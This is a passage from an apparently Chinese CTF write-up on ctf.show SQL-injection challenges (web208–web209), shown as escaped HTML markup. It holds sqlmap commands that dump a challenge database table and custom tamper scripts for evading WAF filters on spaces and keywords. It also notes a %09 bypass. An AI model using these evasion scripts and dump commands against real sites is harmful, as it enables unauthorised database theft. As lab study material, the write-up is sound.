-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://04b302d1-1b4e-439c-8afd-8ce6d287c653.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://04b302d1-1b4e-439c-8afd-8ce6d287c653.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=khfj7v9mah0p28b43l00da7674&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;space2comment,randomcase&amp;#34;&lt;/span> -D ctfshow_web -T ctfshow_flaxcac --dump
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>也可以用&lt;code>space2formfeed.py&lt;/code>(自己写)&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;span class="lnt">12
-&lt;/span>&lt;span class="lnt">13
-&lt;/span>&lt;span class="lnt">14
-&lt;/span>&lt;span class="lnt">15
-&lt;/span>&lt;span class="lnt">16
-&lt;/span>&lt;span class="lnt">17
-&lt;/span>&lt;span class="lnt">18
-&lt;/span>&lt;span class="lnt">19
-&lt;/span>&lt;span class="lnt">20
-&lt;/span>&lt;span class="lnt">21
-&lt;/span>&lt;span class="lnt">22
-&lt;/span>&lt;span class="lnt">23
-&lt;/span>&lt;span class="lnt">24
-&lt;/span>&lt;span class="lnt">25
-&lt;/span>&lt;span class="lnt">26
-&lt;/span>&lt;span class="lnt">27
-&lt;/span>&lt;span class="lnt">28
-&lt;/span>&lt;span class="lnt">29
-&lt;/span>&lt;span class="lnt">30
-&lt;/span>&lt;span class="lnt">31
-&lt;/span>&lt;span class="lnt">32
-&lt;/span>&lt;span class="lnt">33
-&lt;/span>&lt;span class="lnt">34
-&lt;/span>&lt;span class="lnt">35
-&lt;/span>&lt;span class="lnt">36
-&lt;/span>&lt;span class="lnt">37
-&lt;/span>&lt;span class="lnt">38
-&lt;/span>&lt;span class="lnt">39
-&lt;/span>&lt;span class="lnt">40
-&lt;/span>&lt;span class="lnt">41
-&lt;/span>&lt;span class="lnt">42
-&lt;/span>&lt;span class="lnt">43
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/env python&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">See the file &amp;#39;LICENSE&amp;#39; for copying permission
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">lib.core.compat&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">xrange&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">lib.core.enums&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">PRIORITY&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__priority__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PRIORITY&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">LOW&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">dependencies&lt;/span>&lt;span class="p">():&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">tamper&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">kwargs&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">payload&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">quote&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">doublequote&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">firstspace&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">False&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">False&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">False&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">xrange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">firstspace&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">isspace&lt;/span>&lt;span class="p">():&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">firstspace&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">True&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x0c&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">continue&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">quote&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">quote&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">doublequote&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">doublequote&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34; &amp;#34;&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">doublequote&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">quote&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x0c&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">continue&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">retVal&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://bd248ba1-6a52-494f-8d43-0c0f0da01489.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://bd248ba1-6a52-494f-8d43-0c0f0da01489.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=k07qc4alt8bo9oht2glqb90p52&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;space2formfeed,randomcase&amp;#34;&lt;/span> -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://bd248ba1-6a52-494f-8d43-0c0f0da01489.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://bd248ba1-6a52-494f-8d43-0c0f0da01489.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=k07qc4alt8bo9oht2glqb90p52&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;space2formfeed,randomcase&amp;#34;&lt;/span> -D ctfshow_web -T ctfshow_flaxcac --dump
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>顺表再写个双写绕过的tamper吧&lt;code>doublewords.py&lt;/code>&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;span class="lnt">12
-&lt;/span>&lt;span class="lnt">13
-&lt;/span>&lt;span class="lnt">14
-&lt;/span>&lt;span class="lnt">15
-&lt;/span>&lt;span class="lnt">16
-&lt;/span>&lt;span class="lnt">17
-&lt;/span>&lt;span class="lnt">18
-&lt;/span>&lt;span class="lnt">19
-&lt;/span>&lt;span class="lnt">20
-&lt;/span>&lt;span class="lnt">21
-&lt;/span>&lt;span class="lnt">22
-&lt;/span>&lt;span class="lnt">23
-&lt;/span>&lt;span class="lnt">24
-&lt;/span>&lt;span class="lnt">25
-&lt;/span>&lt;span class="lnt">26
-&lt;/span>&lt;span class="lnt">27
-&lt;/span>&lt;span class="lnt">28
-&lt;/span>&lt;span class="lnt">29
-&lt;/span>&lt;span class="lnt">30
-&lt;/span>&lt;span class="lnt">31
-&lt;/span>&lt;span class="lnt">32
-&lt;/span>&lt;span class="lnt">33
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/env python&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">See the file &amp;#39;LICENSE&amp;#39; for copying permission
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">re&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">lib.core.data&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">kb&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">lib.core.enums&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">PRIORITY&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__priority__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PRIORITY&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">NORMAL&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">dependencies&lt;/span>&lt;span class="p">():&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">tamper&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">kwargs&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">payload&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">keywords_to_double&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;SELECT&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="k">match&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">re&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">finditer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">r&lt;/span>&lt;span class="s2">&amp;#34;\b[A-Za-z_]{2,}\b&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">retVal&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">word&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">match&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">group&lt;/span>&lt;span class="p">()&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">word&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">upper&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">keywords_to_double&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">re&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">r&lt;/span>&lt;span class="s2">&amp;#34;(?i)[`&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s2">&amp;#39;\[]&lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">[`&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s2">&amp;#39;\]]&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="n">word&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">retVal&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mid_pos&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">word&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">//&lt;/span> &lt;span class="mi">2&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">embedded_word&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">word&lt;/span>&lt;span class="p">[:&lt;/span>&lt;span class="n">mid_pos&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">lower&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">word&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">lower&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">word&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">mid_pos&lt;/span>&lt;span class="p">:]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">lower&lt;/span>&lt;span class="p">()&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">retVal&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">word&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">embedded_word&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">retVal&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>环境中过滤了什么，就把这个关键字加到字典里面，就可以了&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://991ba5f3-26b5-49f4-824c-dab037a17321.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://991ba5f3-26b5-49f4-824c-dab037a17321.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=k07qc4alt8bo9oht2glqb90p52&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;space2formfeed,doublewords&amp;#34;&lt;/span> -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://991ba5f3-26b5-49f4-824c-dab037a17321.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://991ba5f3-26b5-49f4-824c-dab037a17321.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=k07qc4alt8bo9oht2glqb90p52&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;space2formfeed,doublewords&amp;#34;&lt;/span> -D ctfshow_web -T ctfshow_flaxcac --dump --batch
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h3 id="web209">web209
-&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;span class="lnt">4
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">waf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$str&lt;/span>&lt;span class="p">){&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//TODO 未完工
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="nx">preg_match&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/ |\*|\=/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$str&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>过滤了&lt;code>*&lt;/code>那&lt;code>space2comment&lt;/code>就用不了了，其实我们需要绕过的就是空格，这里利用&lt;code>%09&lt;/code>绕过，&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;span class="lnt">12
